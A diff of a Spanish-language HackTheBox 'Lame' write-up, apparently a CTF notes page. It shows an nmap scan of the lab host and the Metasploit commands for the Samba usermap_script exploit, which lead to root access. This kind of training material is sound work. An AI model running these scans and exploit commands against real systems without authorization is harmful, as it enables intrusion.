@@ -6,30 +6,59 @@ dificultad: Easy
 plataforma: HackTheBox
 ---
 
-# 🔍 Enumeración
+# 🧠 HTB - Lame
+
+## 🔍 Enumeración
+
+Escaneo inicial:
 
 ```bash
 nmap -sC -sV 10.10.10.3
+```
 
-Servicios detectados:
+### 📡 Servicios detectados
 
-Samba vulnerable
-💥 Explotación
-
-Usamos exploit:
-
-msfconsole
-use exploit/multi/samba/usermap_script
-🧠 Privilege Escalation
-
-Acceso root directo debido a mala configuración.
-
-🏁 Conclusión
-
-Máquina fácil, ideal para principiantes.
+- FTP
+- SSH
+- Samba (⚠️ vulnerable)
 
 ---
 
-# 📄 4️⃣ `writeups.html` PRO (listado dinámico)
+## 💥 Explotación
+
+Se detecta vulnerabilidad en Samba (`usermap_script`)
 
 ```bash
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+run
+```
+
+✔️ Acceso conseguido como usuario
+
+---
+
+## 🔐 Privilege Escalation
+
+No es necesaria escalada compleja.
+
+El sistema está mal configurado y permite acceso root directo.
+
+---
+
+## 🏁 Conclusión
+
+Máquina muy sencilla:
+
+- Ideal para principiantes  
+- Introduce conceptos básicos de explotación  
+- Buen primer contacto con HackTheBox  
+
+---
+
+## 🏷️ Tags
+
+- #HTB  
+- #Easy  
+- #Samba  
